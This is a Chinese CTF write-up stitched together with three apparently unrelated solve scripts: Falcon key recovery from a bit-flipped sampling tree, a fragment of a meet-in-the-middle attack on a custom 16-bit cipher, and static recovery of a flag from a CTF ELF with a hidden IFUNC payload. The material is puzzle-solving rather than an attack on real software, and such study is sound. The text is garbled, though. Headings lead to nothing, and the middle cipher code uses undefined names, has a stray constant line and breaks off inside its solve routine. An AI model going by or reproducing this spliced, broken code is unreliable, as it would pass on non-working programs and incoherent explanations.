关键点：密钥流只取决于 D = f·adj(f) + g·adj(g)（整数多项式），其它都是噪声源与提示。

1. 先搞清楚 memory 里到底是什么

expanded_doubles 的序列化顺序是：

fft(f) ‖ fft(g) ‖ fft(F) ‖ fft(G) ‖ 树的所有节点（前序） ‖ 所有叶子（前序）

前 4 个数组正好是 4 × 2 × 128 = 1024 个 double，而题目砍掉的正是 8*128*8 = 8192 字节 = 1024 个 double —— 于是 memory 从最左侧那条链开始。完整树由

Ltop(G01/G00, 128 复数)
├── tree(G00)      G00 = |f̂|² + |ĝ|²   ← 就是我们要的 D 的 NTT
└── tree(Dright)   Dright = G11 - |G01|²/G00

组成，节点区共 256 + 896 + 896 = 2048 个 double，叶子 256 个。实测偏移：

2. 纠错的核心：实数树的”扭转”恒等式

树里存的是 Falcon 的 fp 采样树，每个节点由数组 A（长度 n，h = n/2）分半得到：

E = (A[:h] + A[h:]) / 2 ,   O = (A[:h] - A[h:]) / (2·ρ_j) ,   L = conj(O)/E
ρ_j = exp(i·π·(2j+1)/n)

当 A 是实数组（G00、Dright、以及所有 H_k 都是实数）时必有

L_j = t_j · ρ_j ,  t_j = (A[j]-A[j+h]) / (A[j]+A[j+h]) ∈ R
    ⟹  Im( L_j · conj(ρ_j) ) = 0        （精确到 1e-16）
并且   A[j] = E_j(1+t_j) ,  A[j+h] = E_j(1-t_j)     ← 自底向上重建的递推式

这条 Im(L·conj ρ)=0 就是检错器（有 bit 错就偏离 0 到 1e-3…1e0）， 把修复问题化成”找一组少数 bit 翻转让虚部归零”。因为正确值必须满足 im' = re' · tan(angle)，可以不用暴力枚举 2^128：把两个字的”≤4 bit 翻转可达值集合” 做交集匹配（排序 + 二分）即可一次列全候选：

pos = np.searchsorted(im_sorted, re_v * tan_angle)
# 再检验 |im' - re'·tan| 是否 < 1e-9·|·| 且  |t| ≤ 1

|t| = |Δ|/(2E) ≤ 1 这条也能砍掉大量假候选。

127 个复数对里约 94 个原样可信，约 33 个需要修，修复后仍有 ~30 个是”歧义”的： 典型如把实部或虚部的符号位翻回来都能满足扭转关系（因为一次符号翻转既可能是真错，也可能本来没错）。

3. 第二条分支：G00 · Dright = q²

由 fG − gF = q 可得 Gram 行列式恒为 q²：

G00·G11 − |G01|² = q²   ⟹   Dright = G11 − |G01|²/G00 = q² / G00

于是 tree(Dright) 是 q²/G00 的一份独立测量：

  • 它的第一层节点满足 t' = -t（实测 23/23 个无噪对精确成立），
  • 整棵树又能把 q²/Dright 的 128 个值还原出来。

两者必须互为倒数：G00_j · Dright_j / q² = 1（真解误差 ~1e-7，错选则 ≥1）。 这正是消除”歧义候选”的判据 —— 用的是另一批互不相关的 double，噪声独立。

4. 最后 2 个符号：靠 D 的整数性

还存在一个联合退化：把 G00_j ↔ G00_{j+h} 与 Dright_j ↔ Dright_{j+h} 同时交换， G00·Dright 逐点乘积不变，第 3 步看不出来。而 D = IFFT(G00) 必须是整数向量：

D_k = (1/N) Σ_j G00_j · ρ_j^{-k}    ∈ Z

这一步只对链 A 成立，因此能打破联合退化：对剩余歧义对穷举 1–2 个改动， 取 max|D - round(D)| 最小的组合即可。

5. 求解流程（最终脚本做的事）

  1. 解析 memory → 2304 个 64-bit 字；
  2. 对链 A、链 B 的每个复数对生成候选 t（≤4 bit/字，按翻转数排序，保留 24 个）；
  3. 自底向上重建 G00、q²/G00（链 B 的叶子用 mean(q²/G00) 直接推出）；
  4. 模拟退火 + 坐标下降最小化 Σ_j |G00_j·Dright_j/q² − 1|；
  5. 整数性精修：在 D 上枚举 1–2 个候选替换，取残差最小者；
  6. fk = sha256("frozen:" + str(D))，flag = ct XOR keystream(fk)。

6. 结果（两组实例，均为 nc 现场取到）

自洽性检查：D[0] 与”链 A 最深叶子”完全相等（叶子就是 mean(G00) = D[0]）， max|D| ≈ 1e4 与 sigma = 19.16 的自相关量级吻合，密文解出合法 flag 格式。 另外在本地生成的多个真值实例上（用同一套 task.py 逻辑 + 已知 f,g）都能精确还原 D， 说明不是运气。

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""frozen  --  full solve.

usage:
    python frozen_solve.py instance.txt             # solve a captured transcript
    python frozen_solve.py --fetch 39.96.85.161 22627

Recovers D = f*f* + g*g* (Falcon key of task.py) out of the bit-corrupted
ffSampling tree and decrypts the flag.

How the blob is laid out (after task.py chops the 4 fft() arrays = 1024 doubles):

    Ltop(256 doubles) | tree(G00) | tree(Dright) | all leaves
    G00    = |f_hat|^2 + |g_hat|^2 = D(rho_j),   rho_j = exp(i*pi*(2j+1)/128)
    Dright = G11 - |G01|^2/G00 = q^2 / G00      (because fG - gF = q)

Both trees are "real" trees: for a real array A with h = |A|/2 the stored node is
    L_j = t_j * rho_j,      t_j = (A[j]-A[j+h])/(A[j]+A[j+h])  in R
    A[j] = E_j (1+t_j),     A[j+h] = E_j (1-t_j),  E_j = (A[j]+A[j+h])/2
so Im(L_j*conj(rho_j)) == 0 identifies and repairs the corrupted bits; the two
trees must be reciprocal (G00*Dright = q^2), which resolves almost every repair;
the surviving sign ambiguity is fixed by requiring D = IFFT(G00) to be integral.
"""
import hashlib
import itertools
import math
import random
import re
import socket
import sys

import numpy as np

N, Q = 128, 12289
Q2 = Q * Q

CHAIN_A = [(1, 128, 64, 256), (2, 64, 32, 384), (3, 32, 16, 448), (4, 16, 8, 480),
           (5, 8, 4, 496), (6, 4, 2, 504), (7, 2, 1, 508)]
LEAF_A = 2048
CHAIN_B = [(1, 128, 64, 1152), (2, 64, 32, 1280), (3, 32, 16, 1344), (4, 16, 8, 1376),
           (5, 8, 4, 1392), (6, 4, 2, 1400), (7, 2, 1, 1404)]
LEAF_B = 2176

TOL_TWIST = 1e-7          # |Im(L conj rho)|/|L| accepted without repair
RELTOL = 1e-9             # a repair must satisfy the twist relation this well
MAXFLIPS = 4              # bit toggles searched per double (noise is ~0.6/word)
MAXC = 24                 # candidates kept per complex pair


def rho_of(n, j):
    a = math.pi * (2 * j + 1) / n
    return complex(math.cos(a), math.sin(a))


RHO = {(n, j): rho_of(n, j) for (_, n, _, _) in CHAIN_A for j in range(n // 2)}
# D_k = (1/N) sum_j G00_j rho_j^{-k}
MINV = np.exp(-1j * math.pi * np.outer(2 * np.arange(N) + 1, np.arange(N)) / N) / N

# every bit mask with up to MAXFLIPS set bits (the noise flips bits 0..55 and 63)
_m = [(0, 0)]
for _k in range(1, MAXFLIPS + 1):
    for _c in itertools.combinations(range(64), _k):
        _v = 0
        for _b in _c:
            _v |= 1 << _b
        _m.append((_v, _k))
MASKS = np.array([x for x, _ in _m], dtype=np.uint64)
COUNTS = np.array([k for _, k in _m], dtype=np.int64)


def f_of(w):
    return np.array([w], dtype="<u8").view("<f8")[0]


class Frozen:
    def __init__(self, blob, log=print):
        self.W = np.frombuffer(blob, dtype="<u8").copy()
        self.log = log

    # ---------------- per complex pair: all small repairs ----------------
    def pair_cands(self, ri, ii, r):
        """Every (t, nflips) with L = t*rho reachable by <=MAXFLIPS toggles/word.
        The corrected pair must satisfy im' = re' * tan(angle), so intersect the
        two reachable float sets instead of enumerating all flip combinations."""
        if abs(r.real) < 1e-13:
            return []
        wr, wi = int(self.W[ri]), int(self.W[ii])
        with np.errstate(invalid="ignore", over="ignore"):
            re_v = np.ascontiguousarray(np.uint64(wr) ^ MASKS).view("<f8")
            im_v = np.ascontiguousarray(np.uint64(wi) ^ MASKS).view("<f8")
            target = re_v * (r.imag / r.real)
        order = np.argsort(im_v)
        im_s = im_v[order]
        pos = np.searchsorted(im_s, target)
        tol = RELTOL * np.maximum(np.abs(target), 1e-300) + 1e-300
        ha, hb = [], []
        for off in (-1, 0, 1):
            idx = np.clip(pos + off, 0, len(im_s) - 1)
            m = np.isfinite(target) & np.isfinite(im_s[idx]) & (np.abs(im_s[idx] - target) <= tol)
            if m.any():
                ha.append(np.nonzero(m)[0])
                hb.append(idx[m])
        if not ha:
            return []
        A = np.concatenate(ha)
        Bq = order[np.concatenate(hb)]
        imsel = im_s[np.concatenate(hb)]
        with np.errstate(invalid="ignore", over="ignore"):
            tvals = re_v[A] * r.real + imsel * r.imag
            flips = COUNTS[A] + COUNTS[Bq]
            ll = np.hypot(re_v[A], imsel)
            uim = np.abs(imsel * r.real - re_v[A] * r.imag)
            relv = np.where(ll > 0, uim / np.maximum(ll, 1e-300), 0.0)
        keep = np.isfinite(tvals) & (np.abs(tvals) <= 1 + 1e-9)   # |t| = |dA|/(2E) <= 1
        tvals, flips, relv = tvals[keep], flips[keep], relv[keep]
        out, seen = [], set()
        for idx in np.lexsort((relv, flips)):                     # fewest flips first
            t = float(tvals[idx])
            key = round(t, 12)
            if key in seen:
                continue
            seen.add(key)
            out.append((t, int(flips[idx]), float(relv[idx])))
            if len(out) >= MAXC:
                break
        return out

    def decode_chain(self, chain, tag):
        """t-vector candidates per (level, index); untouched values pass directly."""
        cands, nok, nrep = {}, 0, 0
        for (k, n, h, start) in chain:
            for j in range(h):
                ri, ii = start + j, start + h + j
                r = RHO[(n, j)]
                re, im = f_of(self.W[ri]), f_of(self.W[ii])
                ll = math.hypot(re, im)
                u_im = im * r.real - re * r.imag
                rel = abs(u_im) / ll if (np.isfinite(ll) and ll > 0) else float("inf")
                t = re * r.real + im * r.imag
                if rel <= TOL_TWIST:
                    cands[(k, j)] = [(float(t), 0, rel)]
                    nok += 1
                else:
                    cands[(k, j)] = self.pair_cands(ri, ii, r) or [(float(t), 9, rel)]
                    nrep += 1
        amb = [p for p, c in cands.items() if len(c) > 1]
        self.log(f"  chain {tag}: clean={nok} repaired={nrep} ambiguous={len(amb)}")
        return cands, amb

    # ---------------- reconstruction ----------------
    @staticmethod
    def recon(chain, ts, leaf):
        E = np.array([complex(leaf)])
        for (k, n, h, st) in reversed(chain):
            t = ts[k]
            up = np.zeros(2 * h, dtype=complex)
            up[:h] = E * (1 + t)
            up[h:] = E * (1 - t)
            E = up
        return E

    @staticmethod
    def ts_of(chain, choice, base):
        ts = {k: np.zeros(h) for (k, n, h, s) in chain}
        for (k, j), v in base.items():
            ts[k][j] = v
        for (k, j), v in choice.items():
            ts[k][j] = v
        return ts

    def leaf_cands(self):
        """D[0] = sum(f^2) + sum(g^2) ~ 2*N*sigma^2 ~ 1e5 and is an integer."""
        w0 = int(self.W[LEAF_A])
        raw = f_of(self.W[LEAF_A])
        bits = [1 << b for b in range(64)]
        opts = [0] + bits + [a | b for a, b in itertools.combinations(bits, 2)]
        out, seen = [], set()
        for mm in opts:
            if mm in seen:
                continue
            seen.add(mm)
            v = f_of(np.uint64(w0 ^ mm))
            if not (np.isfinite(v) and 1e4 < v < 1e7 and abs(v - round(v)) < 1e-6):
                continue
            if any(abs(v - x) <= 1e-9 * max(1.0, abs(x)) for x in out):
                continue
            out.append(float(v))
        out.sort(key=lambda v: abs(v - raw))
        return out[:5]

    # ---------------- the two trees must be reciprocal ----------------
    def energy(self, chA, chB, leafA, fixA, fixB):
        GA = self.recon(CHAIN_A, self.ts_of(CHAIN_A, chA, fixA), leafA)
        leafB = float(np.mean(np.real(Q2 / np.real(GA))))     # mean(Dright)
        DB = self.recon(CHAIN_B, self.ts_of(CHAIN_B, chB, fixB), leafB)
        return float(np.abs(np.real(GA) * np.real(DB) / Q2 - 1.0).sum())

    def descent(self, chA, chB, leafA, fixA, fixB, ambA, ambB, cA, cB, rounds=10):
        for _ in range(rounds):
            changed = False
            for p in ambA:
                cur = chA[p]
                GA = self.recon(CHAIN_A, self.ts_of(CHAIN_A, chA, fixA), leafA)
                leafB = float(np.mean(np.real(Q2 / np.real(GA))))
                DB = self.recon(CHAIN_B, self.ts_of(CHAIN_B, chB, fixB), leafB)
                bv, bs = cur, float(np.abs(np.real(GA) * np.real(DB) / Q2 - 1.0).sum())
                for (t, _s, _r) in cA[p]:
                    if t == cur:
                        continue
                    chA[p] = t
                    e = self.energy(chA, chB, leafA, fixA, fixB)
                    if e < bs:
                        bv, bs = t, e
                chA[p] = bv
                changed |= (bv != cur)
            for p in ambB:
                cur = chB[p]
                GA = self.recon(CHAIN_A, self.ts_of(CHAIN_A, chA, fixA), leafA)
                leafB = float(np.mean(np.real(Q2 / np.real(GA))))
                DB = self.recon(CHAIN_B, self.ts_of(CHAIN_B, chB, fixB), leafB)
                bv, bs = cur, float(np.abs(np.real(GA) * np.real(DB) / Q2 - 1.0).sum())
                for (t, _s, _r) in cB[p]:
                    if t == cur:
                        continue
                    chB[p] = t
                    D2 = self.recon(CHAIN_B, self.ts_of(CHAIN_B, chB, fixB), leafB)
                    e = float(np.abs(np.real(GA) * np.real(D2) / Q2 - 1.0).sum())
                    if e < bs:
                        bv, bs = t, e
                chB[p] = bv
                changed |= (bv != cur)
            if not changed:
                break
        return chA, chB

    def anneal(self, seed, ambA, ambB, cA, cB, fixA, fixB, leafA, steps=8000):
        rng = random.Random(seed)
        chA = {p: cA[p][0][0] for p in ambA}
        chB = {p: cB[p][0][0] for p in ambB}
        chA, chB = self.descent(chA, chB, leafA, fixA, fixB, ambA, ambB, cA, cB)
        cur = self.energy(chA, chB, leafA, fixA, fixB)
        best = (cur, dict(chA), dict(chB))
        T0, T1 = 3.0, 0.02
        for st in range(steps):
            T = T0 * (T1 / T0) ** (st / steps)
            if st % 200 == 0:
                chA, chB = self.descent(chA, chB, leafA, fixA, fixB, ambA, ambB, cA, cB, rounds=3)
                cur = self.energy(chA, chB, leafA, fixA, fixB)
                if cur < best[0]:
                    best = (cur, dict(chA), dict(chB))
            which = rng.random() < 0.5
            grp = ambA if which else ambB
            p = grp[rng.randrange(len(grp))]
            cands = cA[p] if which else cB[p]
            if len(cands) < 2:
                continue
            tgt = chA if which else chB
            old = tgt[p]
            new = cands[rng.randrange(len(cands))][0]
            if new == old:
                continue
            tgt[p] = new
            e = self.energy(chA, chB, leafA, fixA, fixB)
            if e <= cur or rng.random() < math.exp(-(e - cur) / max(T, 1e-9)):
                cur = e
            else:
                tgt[p] = old
        chA, chB = self.descent(chA, chB, leafA, fixA, fixB, ambA, ambB, cA, cB, rounds=8)
        cur = self.energy(chA, chB, leafA, fixA, fixB)
        if cur < best[0]:
            best = (cur, dict(chA), dict(chB))
        return best

    # ---------------- final: integrality of D ----------------
    def polish(self, chA, fixA, leafA, ambA, cA, maxk=2):
        """The joint swap G00_j<->G00_{j+h} + Dright_j<->Dright_{j+h} is invisible
        to the two-tree test, so settle the leftover signs on D = IFFT(G00)."""
        GA0 = self.recon(CHAIN_A, self.ts_of(CHAIN_A, chA, fixA), leafA)
        D0 = np.real(GA0 @ MINV)
        best = (float(np.max(np.abs(D0 - np.round(D0)))), [])
        opts = []
        for p in ambA:
            cur = chA[p]
            for (t, _s, _r) in cA[p]:
                if t == cur:
                    continue
                ch2 = dict(chA)
                ch2[p] = t
                dz = (np.real(self.recon(CHAIN_A, self.ts_of(CHAIN_A, ch2, fixA), leafA))
                      - np.real(GA0)) @ MINV
                opts.append((dz, p, t))
        for (dz, p, t) in opts:
            r = float(np.max(np.abs(D0 + dz - np.round(D0 + dz))))
            if r < best[0]:
                best = (r, [(p, t)])
        if best[0] > 1e-6 and maxk >= 2:
            for i in range(len(opts)):
                vi = D0 + opts[i][0]
                for j in range(i + 1, len(opts)):
                    if opts[i][1] == opts[j][1]:
                        continue
                    v = vi + opts[j][0]
                    r = float(np.max(np.abs(v - np.round(v))))
                    if r < best[0]:
                        best = (r, [(opts[i][1], opts[i][2]), (opts[j][1], opts[j][2])])
                    if best[0] < 1e-6:
                        break
                if best[0] < 1e-6:
                    break
        return best

    # ---------------- driver ----------------
    def solve(self, annego=6):
        cA, ambA = self.decode_chain(CHAIN_A, "A (G00)")
        cB, ambB = self.decode_chain(CHAIN_B, "B (q^2/G00)")
        fixA = {p: c[0][0] for p, c in cA.items() if len(c) == 1}
        fixB = {p: c[0][0] for p, c in cB.items() if len(c) == 1}
        leavesA = self.leaf_cands()
        self.log(f"  leafA candidates {leavesA[:3]}")
        best = None
        for leafA in leavesA:
            for seed in range(annego):
                e, chA, chB = self.anneal(seed, ambA, ambB, cA, cB, fixA, fixB, leafA)
                r, chg = self.polish(chA, fixA, leafA, ambA, cA)
                self.log(f"  leaf={leafA!r} seed={seed}: energy={e:.2e} residual={r:.2e} "
                         f"({len(chg)} sign fixes)")
                if best is None or r < best[0]:
                    best = (r, dict(chA), leafA, chg)
                if r < 1e-6:
                    break
            if best[0] < 1e-6:
                break
        r, chA, leafA, chg = best
        for (p, t) in chg:
            chA[p] = t
        GA = self.recon(CHAIN_A, self.ts_of(CHAIN_A, chA, fixA), leafA)
        D = np.real(GA @ MINV)
        res = float(np.max(np.abs(D - np.round(D))))
        self.log(f"  integrality residual {res:.3e}, max|D| {int(np.abs(np.round(D)).max())}")
        return np.round(D).astype(np.int64), res


def keystream(key, length):
    out, ctr = b"", 0
    while len(out) < length:
        out += hashlib.sha256(key + ctr.to_bytes(4, "big")).digest()
        ctr += 1
    return out[:length]


def decrypt(D, ct):
    fk = hashlib.sha256(b"frozen:" + ",".join(str(int(c)) for c in D).encode()).digest()
    return bytes(a ^ b for a, b in zip(ct, keystream(fk, len(ct))))

# ----------------------------------------------------------------------------
# 1. 16-bit 基础运算
# ----------------------------------------------------------------------------
def rotl(x, n):
    x = x.astype(np.uint32)
    return (((x << np.uint32(n)) | (x >> np.uint32(16 - n))) & np.uint32(0xFFFF)).astype(np.uint16)

def rotr(x, n):
    x = x.astype(np.uint32)
    return (((x >> np.uint32(n)) | (x << np.uint32(16 - n))) & np.uint32(0xFFFF)).astype(np.uint16)

def inv_h7(y):
    """x ^ (x >> 7) 的逆（2*7 >= 16，所以只有三项）"""
    return (y ^ (y >> np.uint16(7)) ^ (y >> np.uint16(14))).astype(np.uint16)

def inv_h5(y):
    """x ^ (x >> 5) 的逆：y ^ y>>5 ^ y>>10 ^ y>>15"""
    return (y ^ (y >> np.uint16(5)) ^ (y >> np.uint16(10)) ^ (y >> np.uint16(15))).astype(np.uint16)

# ----------------------------------------------------------------------------
# 2. gen(): 24-bit v -> 8 个 16-bit 字
#    注意两个坑：
#      (1) 开头 and eax,0xffffff —— 只取低 24 bit
#      (2) 循环里作为“进位”传下去的是 u = t ^ (t>>16)，
#          写出的字才是 u ^ (u>>16)
# ----------------------------------------------------------------------------
def gen(v, seed):
    v = np.asarray(v, dtype=np.uint32)
    x = ((v & np.uint32(0xFFFFFF)) ^ np.uint32(seed)).astype(np.uint32)
    x = x ^ (x >> np.uint32(13))
    x = (x * np.uint32(0x45D9F3B)).astype(np.uint32)
    x = x ^ (x >> np.uint32(16))
    i = np.uint32(0)
    out = []
    for _ in range(8):
        x = (x + i + np.uint32(0x9E3779B9)).astype(np.uint32)   # x + i - 0x61C88647
        i = (i + np.uint32(0x7F4A7C15)).astype(np.uint32)       # 8 轮后正好 0xFA53E0A8
        t = x ^ (x >> np.uint32(13))
        t = (t * np.uint32(0x85EBCA6B)).astype(np.uint32)
        u = (t ^ (t >> np.uint32(16))).astype(np.uint32)
        out.append(((u ^ (u >> np.uint32(16))) & np.uint32(0xFFFF)).astype(np.uint16))
        x = u
    return out

# ----------------------------------------------------------------------------
# 3. block(): 16 lane 上的 8 字变换
#    每个 block 开头状态 ^= 状态>>5（premix）；
#    第 p 个字（p=0..6）做完 rotl9(h7(x)) 后还要 ^= >>5，
#    第 7 个字不再做这一步（对应 0x1e74 之后直接返回）。
# ----------------------------------------------------------------------------
def rnd_fwd(s, w, last):
    x = ((w.astype(np.uint32)[:, None] + C32[None, :] + rotl(s, 3).astype(np.uint32))
         & np.uint32(0xFFFF)).astype(np.uint16)
    B = rotl((x ^ (x >> np.uint16(7))).astype(np.uint16), 9)
    return B if last else (B ^ (B >> np.uint16(5))).astype(np.uint16)

def block_fwd(s, ws):
    s = (s ^ (s >> np.uint16(5))).astype(np.uint16)      # premix
    for p in range(8):
        s = rnd_fwd(s, ws[p], p == 7)
    return s

def rnd_inv(s, w, last):
    B = s if last else inv_h5(s)
    x = inv_h7(rotr(B, 9))
    u = rotr((x.astype(np.uint32) - w.astype(np.uint32)[:, None] - C32[None, :])
             & np.uint32(0xFFFF), 3)
    return u                     # u 就是上一轮的状态；premix 在 block_inv 末尾统一撤销

def block_inv(s, ws):
    for p in range(7, -1, -1):
        s = rnd_inv(s, ws[p], p == 7)
    return inv_h5(s)                                     # 撤销 premix

# 4. 加密 / 块边界状态
# ----------------------------------------------------------------------------
def s1_forward(v):
    """第一块（用 SEED1）的输出，即两块之间的共享状态 S1"""
    s = np.tile(INIT[None, :], (len(v), 1))
    return block_fwd(s, gen(v, SEED1))

def s1_backward(v, final):
    """从密文逆推第二块，得到 S1"""
    s = np.tile(final[None, :], (len(v), 1))
    return block_inv(s, gen(v, SEED2))

def encrypt(v1, v2):
    """完整加密，返回 16 个 uint16 word"""
    s = np.tile(INIT[None, :], (np.atleast_1d(v1).shape[0], 1))
    s = block_fwd(s, gen(v1, SEED1))
    s = block_fwd(s, gen(v2, SEED2))
    return s

              0x2545F4914F6CDD1D, 0xD6E8FEB86659FD93, 0xA0761D6478BD642F,

FP_MASK = np.uint64(0xFFFFFFFFFF)                       # 40 bit

def fingerprint(s):
    acc = np.zeros(s.shape[0], dtype=np.uint64)
    for l in range(16):
        acc = acc + s[:, l].astype(np.uint64) * K[l]
    return acc & FP_MASK

def solve(final, N=1 << 24, CH=1 << 20, verbose=True):

    for start in range(0, N, CH):

        fp = fingerprint(s1_forward(v))
        keys.append((fp << np.uint64(24)) | v.astype(np.uint64))
        if verbose:
            print(f"  forward {start + len(v):>8}/{N}  {time.time() - t0:6.1f}s", flush=True)
    keys = np.concatenate(keys)
    keys.sort()
    if verbose:
        print(f"  sort done {time.time() - t0:.1f}s", flush=True)

题解

1. 程序表面是 ELF 查看器，真正逻辑藏在节区之外，通过重叠重定位修改符号表、触发隐藏的 IFUNC resolver。

2. 还原 resolver 后，解开倒序滚动 XOR 加密的代码，得到 flag 校验逻辑。

3. 校验要求 flag{32位十六进制}，内部使用 30 轮 Feistel 变换；逆向运算得到上述结果。

"""Recover ELFStudy's flag statically; never execute the supplied ELF."""

import argparse
import hashlib
from pathlib import Path
import struct


MASK64 = (1 << 64) - 1
DELTA = 0x9E3779B97F4A7C15


def rotate_left(value, count):
    return ((value << count) | (value >> (64 - count))) & MASK64


def restore_payload(original):
    data = bytearray(original)
    for offset in range(0x1388, 0x13E8, 24):
        target, kind, addend = struct.unpack_from("<QQQ", data, offset)
        if kind != 8:
            raise ValueError("Unexpected initial relocation")
        struct.pack_into("<Q", data, target, addend)

    data[0x894:0x8A2] = data[0x1D30:0x1D3E]
    _, info, _, section, address, size = struct.unpack_from("<IBBHQQ", data, 0x890)
    if (info, section, address, size) != (0, 1, 0x1988, 0x390):
        raise ValueError("Unexpected relocation-table COPY source")
    data[0x15E0:0x1970] = data[address:address + size]
    decrypted = False
    for offset in range(0x15E0, 0x1970, 24):
        target, info, addend = struct.unpack_from("<QQQ", data, offset)
        kind, symbol = info & 0xFFFFFFFF, info >> 32
        symbol_address = 0x3F8 + symbol * 24
        if kind == 0:
            continue
        if kind == 33:
            value = struct.unpack_from("<Q", data, symbol_address + 16)[0]
        elif kind == 8:
            value = 0
        elif kind == 1:
            if data[symbol_address + 4] & 15 == 10:
                if (symbol, target) != (55, 0x7386):
                    raise ValueError("Unexpected IFUNC relocation")
                accumulator = 0
                for index in range(0xCB, 0, -1):
                    address = 0x7396 + 4 * index
                    word = struct.unpack_from("<I", data, address)[0] ^ accumulator
                    if word == 0:
                        raise ValueError("Payload decoder aborted")
                    struct.pack_into("<I", data, address, word)
                    accumulator = (accumulator + word) & 0xFFFFFFFF
                decrypted = True
                continue
            value = struct.unpack_from("<Q", data, symbol_address + 8)[0]
        elif kind == 5 and target == 0x15E0:
            # The final COPY restores the ordinary PLT relocation table.
            continue
        else:
            raise ValueError(f"Unsupported relocation: {kind}, symbol {symbol}")
        struct.pack_into("<Q", data, target, (value + addend) & MASK64)
    if not decrypted or data[0x739A:0x739E] != bytes.fromhex("f3 0f 1e fa"):
        raise ValueError("Hidden payload was not restored")
    if data[0x76B6:0x76C4] != b"flag accepted\n":
        raise ValueError("Unexpected success marker")
    return data


def round_function(value, key):
    mixed = rotate_left((value + key) & MASK64, 13) ^ rotate_left(value, 29)
    return (mixed + rotate_left(value, 47)) & MASK64


def recover_flag(data):
    words = struct.unpack_from("<QQQQ", data, 0x7686)
    whitening = (words[0] ^ words[1], words[2] ^ words[3])
    keys = [0, 0, *whitening]
    for index in range(2, 32):
        next_key = (
            rotate_left((keys[index + 1] + keys[index]) & MASK64, 13)
            ^ rotate_left(keys[index], 57)
            ^ ((index * DELTA) & MASK64)
        )
        keys.append(next_key)
    target = struct.unpack_from("<QQ", data, 0x76A6)
    left, right = target
    for key in reversed(keys[4:34]):
        left, right = right ^ round_function(left, key), left
    plaintext = struct.pack("<QQ", left ^ whitening[0], right ^ whitening[1])
    flag = "flag{" + plaintext.hex() + "}"

    # Independently follow the payload's forward checks, including text shape.
    if len(flag) != 38 or flag[:5] != "flag{" or flag[37] != "}":
        raise ValueError("Flag shape verification failed")
    left, right = struct.unpack("<QQ", bytes.fromhex(flag[5:37]))
    left ^= whitening[0]
    right ^= whitening[1]
    for key in keys[4:34]:
        left, right = right, left ^ round_function(right, key)
    if (left, right) != target:
        raise ValueError("Forward flag verification failed")
    return flag, target, whitening


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("input", type=Path)
    args = parser.parse_args()
    original = args.input.read_bytes()
    if len(original) != 43304 or original[:6] != b"\x7fELF\x02\x01":
        raise ValueError("Expected the supplied 43304-byte ELF64 little-endian image")
    data = restore_payload(original)
    flag, target, whitening = recover_flag(data)
    print(f"Input: {args.input}")
    print(f"SHA256: {hashlib.sha256(original).hexdigest()}")
    print(f"Whitening keys: {whitening[0]:016x} {whitening[1]:016x}")
    print(f"Target: {target[0]:016x} {target[1]:016x}")
    print("Verification: flag format and all 30 forward rounds match")
    print(flag)


if __name__ == "__main__":
    main()
